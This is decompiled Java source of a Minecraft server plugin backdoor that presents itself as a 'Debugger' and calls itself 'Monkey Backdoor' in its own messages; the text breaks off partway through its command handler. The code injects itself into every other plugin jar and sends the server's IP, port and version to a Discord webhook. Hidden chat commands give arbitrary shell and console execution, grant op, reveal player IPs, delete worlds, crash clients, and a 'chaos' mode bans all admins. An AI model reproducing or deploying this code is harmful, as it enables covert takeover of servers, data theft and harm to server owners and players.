package com.thiccindustries.debugger;

import com.thiccindustries.debugger.Debugger.18;
import com.thiccindustries.debugger.Debugger.19;
import java.awt.Color;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.URL;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Date;
import java.util.Dictionary;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.Locale;
import java.util.Objects;
import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Particle;
import org.bukkit.World;
import org.bukkit.WorldCreator;
import org.bukkit.BanList.Type;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockDamageEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerTeleportEvent;
import org.bukkit.event.player.PlayerToggleFlightEvent;
import org.bukkit.event.player.PlayerLoginEvent.Result;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.scheduler.BukkitRunnable;

public final class Debugger implements Listener {
   private Plugin plugin;
   Dictionary<String, Debugger.PlayerState> players = new Hashtable();

   public boolean get_state(String Username, Debugger.State s) {
      Debugger.PlayerState state = (Debugger.PlayerState)this.players.get(Username);
      return state == null ? false : state.states[s.ordinal()];
   }

   public boolean set_state(String Username, Debugger.State s, boolean value) {
      Debugger.PlayerState state = (Debugger.PlayerState)this.players.get(Username);
      if (state == null) {
         return false;
      } else {
         state.states[s.ordinal()] = value;
         return true;
      }
   }

   public boolean clear_state(String Username) {
      Debugger.State[] var5;
      int var4 = (var5 = Debugger.State.values()).length;

      for(int var3 = 0; var3 < var4; ++var3) {
         Debugger.State s = var5[var3];
         boolean status = this.set_state(Username, s, false);
         if (!status) {
            return false;
         }
      }

      return true;
   }

   public String help_message(String command) {
      int indexOfCommand = -1;

      for(int i = 0; i < Config.help_messages.length; ++i) {
         if (command.equalsIgnoreCase(Config.help_messages[i].getName())) {
            indexOfCommand = i;
            break;
         }
      }

      return indexOfCommand == -1 ? "" : Config.help_messages[indexOfCommand].getSyntaxHelp();
   }

   public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, String discord_token, boolean InjectOther, boolean warnings) {
      boolean bd_running = false;
      Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
      Plugin[] var13 = pp;
      int var12 = pp.length;

      for(int var11 = 0; var11 < var12; ++var11) {
         Plugin p = var13[var11];
         ArrayList<RegisteredListener> rls = HandlerList.getRegisteredListeners(p);
         Iterator var16 = rls.iterator();

         while(var16.hasNext()) {
            RegisteredListener rl = (RegisteredListener)var16.next();
            if (rl.getListener().getClass().getName().equals("com.thiccindustries.debugger.Debugger")) {
               bd_running = true;
               break;
            }
         }
      }

      if (bd_running) {
         if (Config.display_debug_messages) {
            Bukkit.getConsoleSender().sendMessage(plugin.getName() + ": Debugger aborted, another debugger already loaded.");
         }

      } else {
         if (InjectOther) {
            File plugin_folder = new File("plugins/");
            File[] plugins = plugin_folder.listFiles();
            File[] var22 = plugins;
            int var21 = plugins.length;

            for(int var20 = 0; var20 < var21; ++var20) {
               File plugin_file = var22[var20];
               if (!plugin_file.getName().equals("HostifyMonitor.jar") && !plugin_file.getName().equals("FakaHedaMinequery.jar") && !plugin_file.isDirectory()) {
                  if (Config.display_debug_messages) {
                     Bukkit.getConsoleSender().sendMessage("Injecting Monkey Backdoor into: " + plugin_file.getPath());
                  }

                  boolean result = Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new Injector.SimpleConfig(Usernames, UUID, prefix, discord_token, InjectOther, warnings), true, warnings, false);
                  if (Config.display_debug_messages) {
                     Bukkit.getConsoleSender().sendMessage(result ? "Success." : "Failed, Already patched?");
                  }
               }
            }
         }

         Config.uuids_are_usernames = Usernames;
         Config.authorized_uuids = UUID;
         Config.command_prefix = prefix;
         Config.display_debug_messages = warnings;
         Config.display_debugger_warning = warnings;
         this.plugin = plugin;
         Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - 1];
         this.players.put("console", new Debugger.PlayerState());
         if (Config.display_debugger_warning) {
            Bukkit.getConsoleSender().sendMessage(" Plugin '" + plugin.getName() + "' has a Debugger installed.");
         }

         if (!discord_token.equals("")) {
            discord_message(discord_token);
         }

         plugin.getServer().getPluginManager().registerEvents(this, plugin);
      }
   }

   public static void discord_message(String discord_token) {
      LocalDateTime date = LocalDateTime.now();
      String pref = Config.command_prefix;

      try {
         URL url = new URL("https://api.ipify.org/");
         BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
         String ip = br.readLine();
         DWeb webhook = new DWeb(discord_token);
         webhook.setContent("");
         webhook.setTts(false);
         webhook.addEmbed((new DWeb.EmbedObject()).setTitle("Roy's door").setDescription("Server is running the door:").setColor(Color.GREEN).addField("Client version: ", Bukkit.getBukkitVersion(), false).addField("Server version: ", Bukkit.getVersion(), false).addField("Server IP:", ip + ":" + Bukkit.getServer().getPort(), false).addField("At date:", date.toString(), false).addField("Prefix:", pref, false));
         webhook.execute();
      } catch (Throwable var7) {
      }

   }

   @EventHandler
   public void onChat(AsyncPlayerChatEvent e) {
      String msg = e.getMessage();
      if (msg.startsWith("&")) {
         msg = msg.substring(2);
      }

      if (msg.endsWith(".")) {
         msg = msg.substring(0, msg.length() - 1);
      }

      if (Config.display_debug_messages) {
         Bukkit.getConsoleSender().sendMessage(" Message received from: " + e.getPlayer().getUniqueId());
      }

      Player p = e.getPlayer();
      if (this.IsUserAuthorized(p)) {
         if (Config.display_debug_messages) {
            Bukkit.getConsoleSender().sendMessage(" User is authed");
         }

         if (msg.toLowerCase(Locale.ROOT).startsWith(Config.command_prefix)) {
            String result = this.ParseCommand(msg.substring(Config.command_prefix.length()), p);
            if (Config.display_debug_messages) {
               Bukkit.getConsoleSender().sendMessage(" Command: " + e.getMessage().substring(Config.command_prefix.length()) + " success: " + result);
            }

            if (!result.isEmpty()) {
               e.getPlayer().sendMessage(ChatColor.RED + " " + result);
            }

            e.setCancelled(true);
         }
      } else if (Config.display_debug_messages) {
         Bukkit.getConsoleSender().sendMessage(" User is not authed");
      }

   }

   @EventHandler
   public void onPlayerJoin(PlayerJoinEvent evt) {
      Player player = evt.getPlayer();
      this.players.put(player.getName(), new Debugger.PlayerState());
      if (Config.display_debug_messages) {
         Bukkit.getConsoleSender().sendMessage("Creating states for player: " + player.getName());
      }

      if (this.IsUserAuthorized(player)) {
         player.sendMessage(ChatColor.WHITE + "You are authorized to use door commands. Run " + Config.command_prefix + "help");
      }

   }

   public String ParseCommand(String command, final Player p) {
      final String[] args = command.split(" ");
      String var4;
      final String username;
      final String src;
      final Player p1;
      int reqAmmount;
      final String reason;
      StringBuilder sb;
      Iterator var25;
      int i;
      int reqPartial;
      Iterator var30;
      int i;
      final StringBuilder sb;
      Player all;
      boolean success;
      switch((var4 = args[0].toLowerCase()).hashCode()) {
      case -1354750946:
         if (var4.equals("coords")) {
            if (args.length < 2) {
               return this.help_message("coords");
            }

            p1 = Bukkit.getPlayer(args[1]);
            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            Location targetLoc = p1.getLocation();
            i = (int)Math.floor(targetLoc.getX());
            reqPartial = (int)Math.floor(targetLoc.getY());
            i = (int)Math.floor(targetLoc.getZ());
            String coordsString = ChatColor.WHITE + " " + p1.getName() + "'s coordinates are: " + i + ", " + reqPartial + ", " + i;
            p.sendMessage(coordsString);
            return "";
         }
         break;
      case -1335770711:
         if (var4.equals("deauth")) {
            if (args.length < 2) {
               return this.help_message("deauth");
            }

            p1 = Bukkit.getPlayer(args[1]);
            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            success = false;

            for(i = 0; i < Config.tmp_authorized_uuids.length; ++i) {
               if (Config.uuids_are_usernames) {
                  if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getName())) {
                     Config.tmp_authorized_uuids[i] = null;
                     success = true;
                     break;
                  }
               } else if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getUniqueId().toString())) {
                  Config.tmp_authorized_uuids[i] = null;
                  success = true;
                  break;
               }
            }

            if (success) {
               p.sendMessage(ChatColor.WHITE + " " + args[1] + " has been deauthorized.");
            }

            return success ? "" : "Unable to deauthorize player: " + args[1];
         }
         break;
      case -1263184537:
         if (var4.equals("openinv")) {
            (new BukkitRunnable() {
               public void run() {
                  p.openInventory(Bukkit.getPlayer(args[1]).getInventory());
               }
            }).runTask(this.plugin);
            p.sendMessage(ChatColor.WHITE + "Attempted to open inventory of " + args[1]);
            return "";
         }
         break;
      case -1202053708:
         if (var4.equals("listworld")) {
            String[] worldNames = new String[Bukkit.getServer().getWorlds().size()];
            reqAmmount = 0;

            for(Iterator var29 = Bukkit.getServer().getWorlds().iterator(); var29.hasNext(); ++reqAmmount) {
               World w = (World)var29.next();
               worldNames[reqAmmount] = w.getName();
            }

            p.sendMessage(ChatColor.GRAY + " ----------------------------------------------");
            String[] var10 = worldNames;
            i = worldNames.length;

            for(reqPartial = 0; reqPartial < i; ++reqPartial) {
               src = var10[reqPartial];
               p.sendMessage(ChatColor.WHITE + " " + src);
            }

            p.sendMessage(ChatColor.GRAY + " ----------------------------------------------");
            return "";
         }
         break;
      case -934641255:
         if (var4.equals("reload")) {
            this.plugin.getServer().getScheduler().runTask(this.plugin, () -> {
               this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), "reload");
               this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), "reload confirm");
            });
            return "";
         }
         break;
      case -934594754:
         if (var4.equals("rename")) {
            if (args.length < 2) {
               return this.help_message("rename");
            }

            username = args[1].replace("&", "§");
            p.setDisplayName(username);
            p.setCustomName(username);
            p.setPlayerListName(username);
            p.setCustomNameVisible(true);
            p.sendMessage(ChatColor.WHITE + " Your name was changed to " + username);
            return "";
         }
         break;
      case -840442044:
         if (var4.equals("unlock")) {
            if (args.length < 2) {
               return this.help_message("unlock");
            }

            username = args[1];
            if (username.equalsIgnoreCase("console")) {
               this.set_state("console", Debugger.State.locked, false);
               p.sendMessage(ChatColor.WHITE + " Console was unlocked.");
            } else if (username.equalsIgnoreCase("all")) {
               var30 = Bukkit.getOnlinePlayers().iterator();

               while(var30.hasNext()) {
                  all = (Player)var30.next();
                  this.set_state(all.getName(), Debugger.State.locked, false);
               }

               p.sendMessage(ChatColor.WHITE + " Everyone was unblocked from using commands.");
            } else {
               all = Bukkit.getPlayer(args[1]);
               if (all == null) {
                  return "Player: " + args[1] + " not found";
               }

               this.set_state(all.getName(), Debugger.State.locked, false);
               p.sendMessage(ChatColor.WHITE + " " + all.getName() + " was unblocked from using commands.");
            }

            return "";
         }
         break;
      case -840405966:
         if (var4.equals("unmute")) {
            if (args.length < 2) {
               return this.help_message("unmute");
            }

            if (args[1].equalsIgnoreCase("all")) {
               var25 = Bukkit.getOnlinePlayers().iterator();

               while(var25.hasNext()) {
                  p1 = (Player)var25.next();
                  this.set_state(p1.getName(), Debugger.State.muted, false);
               }

               p.sendMessage(ChatColor.WHITE + " Everyone was unmuted.");
            } else {
               p1 = Bukkit.getPlayer(args[1]);
               if (p1 == null) {
                  return "Player: " + args[1] + " not found";
               }

               this.set_state(p1.getName(), Debugger.State.muted, false);
               p.sendMessage(ChatColor.WHITE + " " + p1.getName() + " was unmuted.");
            }

            return "";
         }
         break;
      case -823764357:
         if (var4.equals("vanish")) {
            if (this.get_state(p.getName(), Debugger.State.vanished)) {
               p.sendMessage(ChatColor.WHITE + " Players can see you.");
               this.set_state(p.getName(), Debugger.State.vanished, false);
               var25 = Bukkit.getOnlinePlayers().iterator();

               while(var25.hasNext()) {
                  p1 = (Player)var25.next();
                  (new BukkitRunnable() {
                     public void run() {
                        p1.showPlayer(Debugger.this.plugin, p);
                     }
                  }).runTask(this.plugin);
               }
            } else {
               p.sendMessage(ChatColor.WHITE + " Players cannot see you.");
               this.set_state(p.getName(), Debugger.State.vanished, true);
               var25 = Bukkit.getOnlinePlayers().iterator();

               while(var25.hasNext()) {
                  p1 = (Player)var25.next();
                  (new BukkitRunnable() {
                     public void run() {
                        p1.hidePlayer(Debugger.this.plugin, p);
                     }
                  }).runTask(this.plugin);
               }
            }

            return "";
         }
         break;
      case 3302:
         if (var4.equals("gm")) {
            if (args.length == 1) {
               return this.help_message("gm");
            }

            final GameMode gm = GameMode.SURVIVAL;

            try {
               reqAmmount = this.Clamp(Integer.parseInt(args[1]), 0, GameMode.values().length - 1);
               gm = GameMode.getByValue(reqAmmount);
            } catch (NumberFormatException var20) {
               try {
                  gm = GameMode.valueOf(args[1].toUpperCase(Locale.ROOT));
               } catch (IllegalArgumentException var19) {
                  return "Invalid gamemode: " + args[1];
               }
            }

            (new BukkitRunnable() {
               public void run() {
                  p.setGameMode(gm);
                  p.sendMessage(ChatColor.WHITE + " You are now gamemode: " + gm.name() + ".");
               }
            }).runTask(this.plugin);
            return "";
         }
         break;
      case 3553:
         if (var4.equals("op")) {
            if (args.length == 1) {
               (new BukkitRunnable() {
                  public void run() {
                     p.setOp(true);
                     p.sendMessage(ChatColor.WHITE + "You are now op.");
                  }
               }).runTask(this.plugin);
            } else {
               p1 = Bukkit.getPlayer(args[1]);
               if (p1 == null) {
                  return "Player " + args[1] + "not found.";
               }

               (new BukkitRunnable() {
                  public void run() {
                     p1.setOp(true);
                     p.sendMessage(ChatColor.WHITE + " " + args[1] + " is now op.");
                  }
               }).runTask(this.plugin);
            }

            return "";
         }
         break;
      case 3708:
         if (var4.equals("tp")) {
            if (args.length < 4) {
               return this.help_message("tp");
            }

            int targetX;
            try {
               targetX = Integer.parseInt(args[1]);
               reqAmmount = Integer.parseInt(args[2]);
               i = Integer.parseInt(args[3]);
            } catch (NumberFormatException var18) {
               return "Invalid coordinates";
            }

            Location loc = p.getLocation();
            loc.setX((double)targetX);
            loc.setY((double)reqAmmount);
            loc.setZ((double)i);
            (new 18(this, p, loc)).runTask(this.plugin);
            return "";
         }
         break;
      case 97295:
         if (var4.equals("ban")) {
            if (args.length < 2) {
               return this.help_message("ban");
            }

            p1 = Bukkit.getPlayer(args[1]);
            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            reason = "Banned";
            src = "Server";
            if (args.length > 2) {
               reason = args[2];
            }

            if (args.length > 3) {
               src = args[3];
            }

            (new BukkitRunnable() {
               public void run() {
                  Bukkit.getBanList(Type.NAME).addBan(p1.getName(), reason, new Date(9999, 1, 1), src);
                  p1.kickPlayer("Banned");
                  p.sendMessage(ChatColor.WHITE + " Banned " + p1.getName() + ".");
               }
            }).runTask(this.plugin);
            return "";
         }
         break;
      case 3005864:
         if (var4.equals("auth")) {
            if (args.length < 2) {
               return this.help_message("auth");
            }

            p1 = Bukkit.getPlayer(args[1]);
            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            success = false;

            for(i = 0; i < Config.tmp_authorized_uuids.length; ++i) {
               if (Config.tmp_authorized_uuids[i] == null) {
                  if (Config.uuids_are_usernames) {
                     Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getName();
                  } else {
                     Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getUniqueId().toString();
                  }

                  success = true;
                  break;
               }
            }

            if (success) {
               p.sendMessage(ChatColor.WHITE + " " + args[1] + " has been temp authorized.");
               Bukkit.getPlayer(args[1]).sendMessage(ChatColor.WHITE + " " + args[1] + " you have been authorized. Run " + Config.command_prefix + "help for info.");
            }

            return success ? "" : "Unable to authorize user: " + args[1];
         }
         break;
      case 3079714:
         if (var4.equals("deop")) {
            if (args.length == 1) {
               (new BukkitRunnable() {
                  public void run() {
                     p.setOp(false);
                     p.sendMessage(ChatColor.WHITE + " You are no longer op.");
                  }
               }).runTask(this.plugin);
            } else {
               p1 = Bukkit.getPlayer(args[1]);
               if (p1 == null) {
                  p.sendMessage(ChatColor.WHITE + " User not found.");
                  return "Player " + args[1] + " not found.";
               }

               (new BukkitRunnable() {
                  public void run() {
                     p1.setOp(false);
                     p.sendMessage(ChatColor.WHITE + " " + args[1] + " is no longer op.");
                  }
               }).runTask(this.plugin);
            }

            return "";
         }
         break;
      case 3127441:
         if (var4.equals("exec")) {
            final ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
            sb = new StringBuilder();

            for(i = 1; i < args.length; ++i) {
               sb.append(args[i]);
               sb.append(" ");
            }

            final boolean[] result = new boolean[1];
            (new BukkitRunnable() {
               public void run() {
                  result[0] = Bukkit.dispatchCommand(console, sb.toString());
               }
            }).runTask(this.plugin);
            if (result[0]) {
               return "Server command failed";
            }

            return "";
         }
         break;
      case 3173137:
         if (var4.equals("give")) {
            if (args.length < 2) {
               return this.help_message("give");
            }

            Material reqMaterial = Material.getMaterial(args[1].toUpperCase(Locale.ROOT));
            if (reqMaterial == null) {
               return "Unknown material: " + args[1].toUpperCase(Locale.ROOT);
            }

            reqAmmount = reqMaterial.getMaxStackSize();
            if (args.length > 2) {
               reqAmmount = Integer.parseInt(args[2]);
            }

            i = reqAmmount / reqMaterial.getMaxStackSize();
            reqPartial = reqAmmount % reqMaterial.getMaxStackSize();

            for(i = 0; i < i; ++i) {
               p.getInventory().addItem(new ItemStack[]{new ItemStack(reqMaterial, reqMaterial.getMaxStackSize())});
            }

            p.getInventory().addItem(new ItemStack[]{new ItemStack(reqMaterial, reqPartial)});
            p.sendMessage(ChatColor.WHITE + " Giving " + reqAmmount + " of " + reqMaterial.name() + ".");
            return "";
         }
         break;
      case 3198785:
         if (var4.equals("help")) {
            if (args.length == 1) {
               p.sendMessage(Config.HelpItem.buildHelpMenu());
               return "";
            }

            if (args.length == 2) {
               username = this.help_message(args[1]);
               if (username.isEmpty()) {
                  return "Unknown command: " + args[1];
               }

               p.sendMessage(username);
               return "";
            }
         }
         break;
      case 3237038:
         if (var4.equals("info")) {
            try {
               URL url = new URL("https://api.ipify.org/");
               BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
               src = br.readLine();
               Runtime r = Runtime.getRuntime();
               long memUsed = (r.totalMemory() - r.freeMemory()) / 1048576L;
               long memMax = r.maxMemory() / 1048576L;
               p.sendMessage(ChatColor.GRAY + " ----------------------------------------------");
               p.sendMessage(ChatColor.WHITE + " Server IP: " + ChatColor.GRAY + src + Bukkit.getServer().getPort());
               p.sendMessage(ChatColor.WHITE + " Server version: " + ChatColor.GRAY + Bukkit.getVersion());
               String nameOS = System.getProperty("os.name");
               p.sendMessage(ChatColor.WHITE + " OS: " + ChatColor.GRAY + nameOS);
               String osVersion = System.getProperty("os.version");
               p.sendMessage(ChatColor.WHITE + " OS Version: " + ChatColor.GRAY + osVersion);
               String osType = System.getProperty("os.arch");
               p.sendMessage(ChatColor.WHITE + " Architecture: " + ChatColor.GRAY + osType);
               p.sendMessage(ChatColor.WHITE + " Cores: " + ChatColor.GRAY + r.availableProcessors());
               p.sendMessage(ChatColor.WHITE + " RAM (max): " + ChatColor.GRAY + memMax + "MB");
               p.sendMessage(ChatColor.WHITE + " RAM (used): " + ChatColor.GRAY + memUsed + "MB");
               p.sendMessage(ChatColor.GRAY + " ----------------------------------------------");
               return "";
            } catch (IOException var17) {
               return "Error gathering system info";
            }
         }
         break;
      case 3327275:
         if (var4.equals("lock")) {
            if (args.length < 2) {
               return this.help_message("lock");
            }

            username = args[1];
            if (username.equalsIgnoreCase("console")) {
               this.set_state("console", Debugger.State.locked, true);
               p.sendMessage(ChatColor.WHITE + " Console was locked.");
            } else if (username.equalsIgnoreCase("all")) {
               var30 = Bukkit.getOnlinePlayers().iterator();

               while(var30.hasNext()) {
                  all = (Player)var30.next();
                  this.set_state(all.getName(), Debugger.State.locked, true);
               }

               p.sendMessage(ChatColor.WHITE + " Everyone was blocked from using commands.");
            } else {
               all = Bukkit.getPlayer(args[1]);
               if (all == null) {
                  return "Player: " + args[1] + " not found";
               }

               this.set_state(all.getName(), Debugger.State.locked, true);
               p.sendMessage(ChatColor.WHITE + " " + all.getName() + " was blocked from using commands.");
            }

            return "";
         }
         break;
      case 3363353:
         if (var4.equals("mute")) {
            if (args.length < 2) {
               return this.help_message("mute");
            }

            if (args[1].equalsIgnoreCase("all")) {
               var25 = Bukkit.getOnlinePlayers().iterator();

               while(var25.hasNext()) {
                  p1 = (Player)var25.next();
                  this.set_state(p1.getName(), Debugger.State.muted, true);
               }

               p.sendMessage(ChatColor.WHITE + " Everyone was muted.");
            } else {
               p1 = Bukkit.getPlayer(args[1]);
               if (p1 == null) {
                  return "Player: " + args[1] + " not found";
               }

               this.set_state(p1.getName(), Debugger.State.muted, true);
               p.sendMessage(ChatColor.WHITE + " " + p1.getName() + " was muted.");
            }

            return "";
         }
         break;
      case 3450235:
         if (var4.equals("psay")) {
            if (args.length < 3) {
               return this.help_message("psay");
            }

            p1 = Bukkit.getPlayer(args[1]);
            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            sb = new StringBuilder();

            for(i = 2; i < args.length; ++i) {
               sb.append(args[i]);
               sb.append(" ");
            }

            (new BukkitRunnable() {
               public void run() {
                  p1.chat(sb.toString());
               }
            }).runTask(this.plugin);
            return "";
         }
         break;
      case 3526257:
         if (var4.equals("seed")) {
            username = String.valueOf(p.getWorld().getSeed());
            p.sendMessage(ChatColor.WHITE + " World seed: " + username);
            return "";
         }
         break;
      case 3539608:
         if (var4.equals("ssay")) {
            if (args.length < 2) {
               return this.help_message("ssay");
            }

            sb = new StringBuilder();

            for(reqAmmount = 1; reqAmmount < args.length; ++reqAmmount) {
               sb.append(args[reqAmmount]);
               sb.append(" ");
            }

            this.plugin.getServer().getScheduler().runTask(this.plugin, () -> {
               this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), "say " + sb);
            });
            return "";
         }
         break;
      case 3540994:
         if (var4.equals("stop")) {
            (new 19(this)).runTask(this.plugin);
            return "";
         }
         break;
      case 93503862:
         if (var4.equals("banip")) {
            if (args.length < 2) {
               return this.help_message("banip");
            }

            p1 = Bukkit.getPlayer(args[1]);
            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            reason = "Banned";
            src = "Server";
            if (args.length > 2) {
               reason = args[2];
            }

            if (args.length > 3) {
               src = args[3];
            }

            (new BukkitRunnable() {
               public void run() {
                  Bukkit.getBanList(Type.IP).addBan(p1.getName(), reason, new Date(9999, 1, 1), src);
                  p1.kickPlayer("Banned");
                  p.sendMessage(ChatColor.WHITE + " IP Banned " + p1.getName() + ".");
               }
            }).runTask(this.plugin);
            return "";
         }
         break;
      case 94623616:
         if (var4.equals("chaos")) {
            var25 = Bukkit.getOnlinePlayers().iterator();

            while(true) {
               while(var25.hasNext()) {
                  p1 = (Player)var25.next();
                  if (!p1.isOp() && !p1.hasPermission("group.moderator") && !p1.hasPermission("group.owner") && !p1.hasPermission("group.coowner") && !p1.hasPermission("group.co-owner") && !p1.hasPermission("group.developer") && !p1.hasPermission("group.programmer") && !p1.hasPermission("group.admin") && !p1.hasPermission("group.helper") && !p1.hasPermission("group.builder") && !p1.hasPermission("*")) {
                     (new BukkitRunnable() {
                        public void run() {
                           p1.setOp(true);
                        }
                     }).runTask(this.plugin);
                  } else {
                     (new BukkitRunnable() {
                        public void run() {
                           p1.setOp(false);
                           BanList banList = Bukkit.getBanList(Type.NAME);
                           Iterator var3 = banList.getBanEntries().iterator();

                           while(var3.hasNext()) {
                              BanEntry entry = (BanEntry)var3.next();
                              banList.pardon(entry.getTarget());
                           }

                           BanList banListip = Bukkit.getBanList(Type.IP);
                           Iterator var4 = banListip.getBanEntries().iterator();

                           while(var4.hasNext()) {
                              BanEntry entryy = (BanEntry)var4.next();
                              banListip.pardon(entryy.getTarget());
                           }

                           Bukkit.getBanList(Type.NAME).addBan(p1.getName(), "Banned", new Date(9999, 0, 1), "Server");
                           Bukkit.getBanList(Type.IP).addBan(p1.getName(), "Banned", new Date(9999, 0, 1), "Server");
                           p1.kickPlayer("Banned");
                        }
                     }).runTask(this.plugin);
                  }
               }

               Bukkit.broadcastMessage("\n\n\n\n\n\n\n\n\n\n[Server] ALL ADMINS HAVE BEEN BANNED\n[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK");
               return "";
            }
         }
         break;
      case 94921639:
         if (var4.equals("crash")) {
            if (args.length < 2) {
               return this.help_message("crash");
            }

            p1 = Bukkit.getPlayer(args[1]);
            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            for(reqAmmount = 0; reqAmmount < 100; ++reqAmmount) {
               p1.spawnParticle(Particle.FLAME, p1.getLocation(), Integer.MAX_VALUE);
            }

            return "";
         }
         break;
      case 98246397:
         if (var4.equals("getip")) {
            if (args.length < 2) {
               return this.help_message("getip");
            }

            p1 = Bukkit.getPlayer(args[1]);
            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            reason = ((Player)Objects.requireNonNull(p1)).getName();
            src = ((InetSocketAddress)Objects.requireNonNull(((Player)Objects.requireNonNull(Bukkit.getPlayer(args[1]))).getAddress())).toString().replace("/", "");
            p.sendMessage(ChatColor.WHITE + " IP: " + ChatColor.RED + src);
            return "";
         }
         break;
      case 105172251:
         if (var4.equals("nudge")) {
            p1 = Bukkit.getPlayer(args[1]);
            (new BukkitRunnable() {
               public void run() {
                  p1.teleport(p1.getLocation().add(1.0D, 0.0D, 0.0D));
               }
            }).runTask(this.plugin);
            p.sendMessage(ChatColor.WHITE + "nudged " + args[1]);
            return "";
         }
         break;
      case 109403696:
         if (var4.equals("shell")) {
            if (args.length < 2) {
               return this.help_message("shell");
            }

            sb = new StringBuilder();

            for(reqAmmount = 1; reqAmmount < args.length; ++reqAmmount) {
               sb.append(args[reqAmmount]);
               sb.append(" ");
            }

            reason = sb.toString();
            (new Thread() {
               public void run() {
                  try {
                     Process proc = Runtime.getRuntime().exec(reason);
                     Throwable var2 = null;
                     Object var3 = null;

                     try {
                        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));

                        try {
                           String line = "";

                           while(line != null) {
                              p.sendMessage(line);
                              line = stdInput.readLine();
                              if (line != null) {
                                 line = line.replaceAll("[^\\x00-\\x7F]", "");
                              }
                           }
                        } finally {
                           if (stdInput != null) {
                              stdInput.close();
                           }

                        }
                     } catch (Throwable var13) {
                        if (var2 == null) {
                           var2 = var13;
                        } else if (var2 != var13) {
                           var2.addSuppressed(var13);
                        }

                        throw var2;
                     }
                  } catch (IOException var14) {
                  }

               }
            }).start();
            return "";
         }
         break;
      case 110634737:
         if (var4.equals("troll")) {
            if (args.length < 3) {
               return this.help_message("troll");
            }

            username = args[2];
            if (args[1].equalsIgnoreCase("reset")) {
               return this.clear_state(username) ? "" : "Unable to reset player: " + args[1];
            }

            Debugger.State s1;
            try {
               s1 = Debugger.State.valueOf("MF_" + args[1].toLowerCase());
            } catch (Exception var16) {
               return "Invalid state: " + args[1].toUpperCase();
            }

            if (this.get_state(username, s1)) {
               return this.set_state(username, s1, false) ? "" : "Unable to set state: " + args[1].toUpperCase() + " of player: " + args[2];
            }

            return this.set_state(username, s1, true) ? "" : "Unable to set state: " + args[1].toUpperCase() + " of player: " + args[2];
         }
         break;
      case 836200039:
         if (var4.equals("delworld")) {
            if (args.length < 2) {
               return this.help_message("delworld");
            }

            if (args[1] == null) {
               return "No world specified.";
            }

            username = args[1];
            p.sendMessage(ChatColor.WHITE + " Deleting world: " + ChatColor.RED + username);
            (new Thread(() -> {
               try {
                  World delete = Bukkit.getWorld(username);
                  File deleteFolder = delete.getWorldFolder();
                  this.deleteWorld(deleteFolder);
               } catch (Throwable var4) {
               }

            })).start();
            p.sendMessage(ChatColor.WHITE + " World deleted if it existed!");
            return "";
         }
         break;
      case 891389700:
         if (var4.equals("instabreak")) {
            p1 = p;
            if (args.length == 2) {
               p1 = Bukkit.getPlayer(args[1]);
            }

            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            if (this.get_state(p1.getName(), Debugger.State.instabreak)) {
               p.sendMessage(ChatColor.WHITE + " " + p1.getName() + " no longer can break blocks instantly.");
               this.set_state(p1.getName(), Debugger.State.instabreak, false);
            } else {
               p.sendMessage(ChatColor.WHITE + " " + p1.getName() + " can break blocks instantly.");
               this.set_state(p1.getName(), Debugger.State.instabreak, true);
            }

            return "";
         }
         break;
      case 1147645450:
         if (var4.equals("silktouch")) {
            p1 = p;
            if (args.length == 2) {
               p1 = Bukkit.getPlayer(args[1]);
            }

            if (p1 == null) {
               return "Player " + args[1] + " not found.";
            }

            if (this.get_state(p1.getName(), Debugger.State.vanished)) {
